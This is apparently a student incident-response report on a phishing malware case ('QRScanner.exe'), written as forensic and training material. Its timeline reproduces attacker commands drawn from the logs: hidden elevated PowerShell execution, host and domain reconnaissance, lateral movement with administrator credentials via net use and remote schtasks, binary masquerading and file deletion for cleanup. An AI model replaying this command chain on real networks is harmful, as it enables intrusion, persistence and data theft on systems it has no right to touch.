# Incident-Response-Forensic-Analysis-Report
This project focuses on log analysis of two infected hosts and a technical report following the events.

[Final Report](./Final%20Report%20and%20Timeline%20AH.pdf)


# Incident Response Report: `QRScanner.exe`

**Case:** `QRScanner.exe` Phishing & Lateral Movement Malware Incident  
**Course:** COP4931  
**Lead Analyst:** Andy Hernandez  
**Date:** December 12, 2025  

---

## Executive Summary

On **June 25, 2025, at approximately 11:17 AM UTC**, the SOC team flagged a malicious phishing email sent to Liam Sherman (`liamsherman@site.com`). The email contained a link to `sodium.ca`, which downloaded an executable named `QRScanner.exe`. Opening this link served as the initial entry point of compromise.

The investigation revealed that two endpoints were infected: **`ACC-WIN10-16`** (Liam) and **`ACC-WIN10-13`** (Rosemary Cortez). Based on indicators of compromise (IOCs) collected across proxy, Windows, and IDS logs, the command-and-control (C2) activity was attributed to a threat group utilizing a custom C2 controller.

---

## Incident Overview

| Metric | Details |
| :--- | :--- |
| **Incident Type** | Malicious Executable / Phishing / C2 Communication |
| **Date & Time (UTC)** | June 25, 2025 @ ~11:17 AM |
| **Initial Detection** | SOC team flagged suspicious email download activity |
| **Infected Hostnames** | `ACC-WIN10-16` (172.16.6.116)<br>`ACC-WIN10-13` (172.16.2.6) |
| **Impact** | Network hosts isolated; minor financial and operational loss due to data exfiltration |

---

## Technical Analysis & Timeline

### Phase 1: Initial Compromise & C2 Setup (`ACC-WIN10-16`)

| Time (UTC) | Source / Event | Technical Details | Event / Action |
| :--- | :--- | :--- | :--- |
| **11:19:32** | Splunk Proxy Log | `GET http://sodium.ca/QRCodeScanner.exe` | Initial Malware Download |
| **11:19:38** | Splunk Proxy Log | `GET http://saltybug.com/register/acc-win10-16/windows` | Initial C2 Communication |
| **11:19:40** | Sysmon Event ID 3 | Executable: `C:\Users\Public\QRCodeScanner.exe` | Network C2 Connection established |
| **11:20:13** | Sysmon Event ID 1 | Encoded PowerShell command attempting runas credential elevation | Privilege Escalation / Payload Execution |
| **11:20:16** | Sysmon Event ID 1 | `powershell.exe -noprofile -command & {Start-Process QRCodeScanner.exe -verb runas -windowstyle hidden}` | Defense Evasion (Hidden Process) |

### Phase 2: Reconnaissance (`ACC-WIN10-16`)

| Time (UTC) | Command Executed | Objective |
| :--- | :--- | :--- |
| **11:22:09** | `cmd /c dir` | Directory Listing |
| **11:22:50** | `wmic cpu get caption, deviceid, name, numberofcores...` | Hardware & System Reconnaissance |
| **11:27:31** | `route print` | Route Table Enumeration |
| **11:28:08** | `tasklist -v` | Running Tasks / Process Reconnaissance |
| **11:28:46** | `ipconfig /all` | Network Interface Enumeration |
| **11:30:02** | `netsh advfirewall show allprofiles` | Firewall Policy Reconnaissance |
| **11:30:45** | `netstat -ano` | Active Network Connections |
| **11:31:25** | `net localgroup administrators` | Local Admin Reconnaissance |
| **11:32:07** | `net user` / `whoami /all /fo list` | Current User Account Privilege Check |
| **11:34:01** | `net view /all /domain` | Domain Enumeration |
| **11:35:31** | `powershell net groups 'Domain Computers' /domain` | Domain Computers Reconnaissance |

### Phase 3: Lateral Movement & Persistence (`ACC-WIN10-13`)

| Time (UTC) | Host | Event / Command | Description |
| :--- | :--- | :--- | :--- |
| **11:37:43** | `ACC-WIN10-16` | `net use \\acc-win10-13 /User:Administrator@site ...` | Lateral movement mapping |
| **11:38:15** | `ACC-WIN10-16` | `robocopy c:\users\Public \\acc-win10-13\C$\Windows\vss QRCodeScanner.exe` | Staging malware payload on target host |
| **11:38:52** | `ACC-WIN10-16` | `schtasks /create /s acc-win10-13 /TN ThreadCleaner ...` | Remote scheduled task creation |
| **11:39:25** | `ACC-WIN10-16` | `schtasks /run /tn ThreadCleaner /s acc-win10-13` | Remote execution of scheduled task |
| **11:39:26** | `ACC-WIN10-13` | Windows Event ID 4624 (Logon Type 4) | Successful logon by `SITE\Administrator` |
| **11:40:00** | `ACC-WIN10-13` | `copy QRCodeScanner.exe C:\Windows\vss\vixDiskMountServer.exe` | Masquerading binary for evasion |
| **11:40:40** | `ACC-WIN10-13` | `Register-ScheduledTask -TaskName "ThreadCleaner" -User "System"` | System-level Persistence established |

### Phase 4: Data Exfiltration & Cleanup

| Time (UTC) | Host | Event / Action | Result |
| :--- | :--- | :--- | :--- |
| **11:41:19** | `ACC-WIN10-13` | PowerShell script collecting user files to `C:\Windows\vss\secret1.file` | Data Staging for Exfiltration |
| **11:44:15** | Network / IDS | Alert `2033045`: `ET INFO POST to Double Slash in URI` | Exfiltration to C2 (`162.241.252.54`) |
| **11:45:33** | `ACC-WIN10-13` | `cmd /c del C:\Windows\vss\secrets.txt` | Footprint Deletion / Cleanup |

---

## Indicators of Compromise (IOCs)

* **Malicious IPs:** `3.64.168.50`, `162.241.253.54`, `162.241.252.54`
* **Malicious Domains:** `sodium.ca`, `saltybug.com`
* **File Names & Paths:** 
  * `QRCodeScanner.exe`
  * `C:\Users\Public\QRCodeScanner.exe`
  * `C:\Windows\vss\QRCodeScanner.exe`
  * `C:\Windows\vss\vixDiskMountServer.exe`
  * `C:\Windows\vss\secret1.file`
* **Persistence Mechanism:** Scheduled Task named `ThreadCleaner`

---

## Remediation & Recommendations

1. **Host Isolation:** Immediately disconnect `ACC-WIN10-16` and `ACC-WIN10-13` from the network to prevent further lateral movement.
2. **Forensic Analysis & Reimaging:** Collect disk and memory artifacts for analysis, then wipe and reimage both hosts.
3. **Phishing Awareness Training:** Conduct organization-wide security training emphasizing link and attachment verification.
4. **Credential Reset:** Rotate credentials for all domain accounts, specifically `SITE.LAN\Administrator`.
5. **Security Audits:** Review local share permissions, restrict explicit credential logging, and enforce tighter execution policies for PowerShell.
